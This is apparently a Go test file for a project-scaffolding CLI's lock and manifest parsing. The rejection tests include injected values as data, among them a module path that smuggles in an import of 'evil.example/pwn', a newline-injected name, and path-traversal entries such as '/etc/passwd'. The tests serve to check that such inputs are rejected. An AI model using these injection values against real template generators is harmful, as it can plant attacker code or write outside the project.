package cli

import (
	"errors"
	"os"
	"path/filepath"
	"runtime/debug"
	"slices"
	"strings"
	"testing"

	"gorbital.dev/cli/internal/recipes"
)

func TestLockRoundTrip(t *testing.T) {
	preset, _ := recipes.LookupPreset("full", recipes.TenancyMulti)
	d := recipes.Data{Name: "shop-api", Module: "example.com/shop-api", Local: "/src/gorbital"}
	files := []recipes.File{
		{Path: "internal/app/app.go", SHA256: "b"},
		{Path: "go.mod", SHA256: "g"},
		{Path: ".env.example", SHA256: "a"},
	}
	want := newLock(preset, d, files)
	if want.Inputs != (lockInputs{Name: "shop-api", Module: "example.com/shop-api", Preset: "full", Tenancy: "multi", Mail: "resend"}) {
		t.Errorf("inputs = %+v", want.Inputs)
	}
	if paths := lockPaths(want); !slices.Equal(paths, []string{".env.example", "internal/app/app.go"}) {
		t.Errorf("tracked files = %v, want sorted and without go.mod", paths)
	}

	dir := t.TempDir()
	root, err := os.OpenRoot(dir)
	if err != nil {
		t.Fatal(err)
	}
	defer root.Close()
	if err := writeLock(root, want); err != nil {
		t.Fatal(err)
	}
	if strings.Contains(readFile(t, filepath.Join(dir, lockPath)), "/src/gorbital") {
		t.Error("gorbital.lock holds the machine-specific --local path")
	}
	got, err := readLock(dir)
	if err != nil {
		t.Fatal(err)
	}
	if got.APIVersion != want.APIVersion || got.Orb != want.Orb || got.Inputs != want.Inputs || !slices.Equal(got.Files, want.Files) {
		t.Errorf("readLock = %+v, want %+v", got, want)
	}
}

func TestReadLockV1(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, filepath.Join(dir, lockPath), `{
  "apiVersion": "gorbital.dev/v1",
  "generator": "orb v0.1.0-dev",
  "recipes": [{"name": "base-full", "version": "v0.1.0", "operations": [
    {"op": "createFile", "path": "internal/app/app.go", "sha256": "b"},
    {"op": "createFile", "path": "go.mod", "sha256": "g"},
    {"op": "createFile", "path": ".env.example", "sha256": "a"}
  ]}]
}`)
	l, err := readLock(dir)
	if err != nil {
		t.Fatal(err)
	}
	if l.APIVersion != lockAPIVersionV1 || l.Orb != (lockOrb{}) || l.Inputs != (lockInputs{}) {
		t.Errorf("v1 lock = %+v, want no release or inputs", l)
	}
	if paths := lockPaths(l); !slices.Equal(paths, []string{".env.example", "internal/app/app.go"}) {
		t.Errorf("files = %v", paths)
	}
}

func TestReadLockRejects(t *testing.T) {
	for name, content := range map[string]string{
		"newer format":   `{"apiVersion": "gorbital.dev/v3"}`,
		"unknown field":  `{"apiVersion": "gorbital.dev/v2", "operations": []}`,
		"escaping path":  `{"apiVersion": "gorbital.dev/v2", "files": [{"path": "../outside.go", "sha256": "a"}]}`,
		"absolute path":  `{"apiVersion": "gorbital.dev/v2", "files": [{"path": "/etc/passwd", "sha256": "a"}]}`,
		"repeated path":  `{"apiVersion": "gorbital.dev/v2", "files": [{"path": "a.go", "sha256": "a"}, {"path": "a.go", "sha256": "b"}]}`,
		"not JSON":       `apiVersion: gorbital.dev/v2`,
		"v1 bad escapes": `{"apiVersion": "gorbital.dev/v1", "recipes": [{"operations": [{"op": "createFile", "path": "../x", "sha256": "a"}]}]}`,
		// Inputs are rendered into every template (CLI-4).
		"injected module": `{"apiVersion": "gorbital.dev/v2", "inputs": {"name": "shop-api", "module": "example.com/shop-api/internal/app\"; _ \"evil.example/pwn", "preset": "full", "tenancy": "single"}, "files": []}`,
		"newline in name": `{"apiVersion": "gorbital.dev/v2", "inputs": {"name": "shop-api\nimage: evil", "module": "example.com/shop-api", "preset": "full", "tenancy": "single"}, "files": []}`,
		"unknown preset":  `{"apiVersion": "gorbital.dev/v2", "inputs": {"name": "shop-api", "module": "example.com/shop-api", "preset": "../full", "tenancy": "single"}, "files": []}`,
		"unknown tenancy": `{"apiVersion": "gorbital.dev/v2", "inputs": {"name": "shop-api", "module": "example.com/shop-api", "preset": "minimal", "tenancy": "multi"}, "files": []}`,
		"unknown mail":    `{"apiVersion": "gorbital.dev/v2", "inputs": {"name": "shop-api", "module": "example.com/shop-api", "preset": "full", "tenancy": "single", "mail": "sendmail"}, "files": []}`,
		"no inputs":       `{"apiVersion": "gorbital.dev/v2", "files": []}`,
	} {
		t.Run(name, func(t *testing.T) {
			dir := t.TempDir()
			writeFile(t, filepath.Join(dir, lockPath), content)
			if _, err := readLock(dir); err == nil {
				t.Errorf("readLock(%s) error = nil", content)
			}
		})
	}
	if _, err := readLock(t.TempDir()); !errors.Is(err, errNoLock) {
		t.Errorf("readLock without a lock = %v, want errNoLock", err)
	}
}

// TestReadManifestRejectsInvalidInputs: gorbital.yaml, which apps from
// before v0.5 upgrade from, is checked like gorbital.lock (CLI-4).
func TestReadManifestRejectsInvalidInputs(t *testing.T) {
	valid := "apiVersion: gorbital.dev/v1\nname: shop-api\nmodule: example.com/shop-api\npreset: full\n"
	dir := t.TempDir()
	writeFile(t, filepath.Join(dir, manifestPath), valid)
	if in, err := readManifest(dir); err != nil || in.Tenancy != recipes.TenancySingle {
		t.Fatalf("readManifest(valid) = %+v, %v", in, err)
	}
	for name, manifest := range map[string]string{
		"injected module": strings.Replace(valid, "example.com/shop-api", `example.com/shop-api/internal/app"; _ "evil.example/pwn`, 1),
		"invalid name":    strings.Replace(valid, "name: shop-api", "name: Shop API", 1),
		"unknown preset":  strings.Replace(valid, "preset: full", "preset: custom", 1),
		"unknown mail":    valid + "mail: sendmail\n",
	} {
		writeFile(t, filepath.Join(dir, manifestPath), manifest)
		if _, err := readManifest(dir); err == nil {
			t.Errorf("%s: readManifest() error = nil", name)
		}
	}
}

func TestLockRecordOnlyTrackedFiles(t *testing.T) {
	l := lockFile{Files: []lockedFile{{Path: ".env.example", SHA256: "old"}, {Path: "internal/app/infra_mail.go", SHA256: "old"}}}
	l.record("internal/app/infra_mail.go", []byte("package app\n"))
	l.record(".env", []byte("SECRET=1\n"))
	if l.Files[1].SHA256 != sha256Hex([]byte("package app\n")) || l.Files[0].SHA256 != "old" || len(l.Files) != 2 || l.tracks(".env") {
		t.Errorf("files = %+v, want only infra_mail.go's hash changed and .env untracked", l.Files)
	}
}

func TestRevisionOf(t *testing.T) {
	setting := func(kv ...string) *debug.BuildInfo {
		info := &debug.BuildInfo{}
		for i := 0; i < len(kv); i += 2 {
			info.Settings = append(info.Settings, debug.BuildSetting{Key: kv[i], Value: kv[i+1]})
		}
		return info
	}
	for _, tt := range []struct {
		name string
		info *debug.BuildInfo
		want string
	}{
		{"clean tree", setting("vcs.revision", "0004f6c", "vcs.modified", "false"), "0004f6c"},
		{"modified tree", setting("vcs.revision", "0004f6c", "vcs.modified", "true"), ""},
		{"modified listed first", setting("vcs.modified", "true", "vcs.revision", "0004f6c"), ""},
		{"no version control", setting(), ""},
	} {
		if got := revisionOf(tt.info); got != tt.want {
			t.Errorf("%s: revisionOf = %q, want %q", tt.name, got, tt.want)
		}
	}
}

// assertLockRebuilds checks that rendering the lock's inputs with this orb's
// templates reproduces every tracked file's recorded hash, and tracks every
// rendered file but go.mod: orb upgrade relies on this to rebuild the merge
// base (ADR-0050).
func assertLockRebuilds(t *testing.T, dir string) {
	t.Helper()
	l, err := readLock(dir)
	if err != nil {
		t.Fatal(err)
	}
	tree, err := recipes.Embedded().Tree(l.Inputs.Preset, l.Inputs.Tenancy, l.Inputs.Mail,
		recipes.Data{Name: l.Inputs.Name, Module: l.Inputs.Module, LibraryVersion: recipes.LibraryVersion})
	if err != nil {
		t.Fatal(err)
	}
	for _, f := range l.Files {
		if content, ok := tree[f.Path]; !ok || sha256Hex(content) != f.SHA256 {
			t.Errorf("rebuilt %s doesn't match its hash in gorbital.lock", f.Path)
		}
	}
	for p := range tree {
		if !slices.Contains(untrackedPaths, p) && !l.tracks(p) {
			t.Errorf("rebuilt %s isn't tracked in gorbital.lock", p)
		}
	}
}

func lockPaths(l lockFile) []string {
	paths := make([]string, len(l.Files))
	for i, f := range l.Files {
		paths[i] = f.Path
	}
	return paths
}
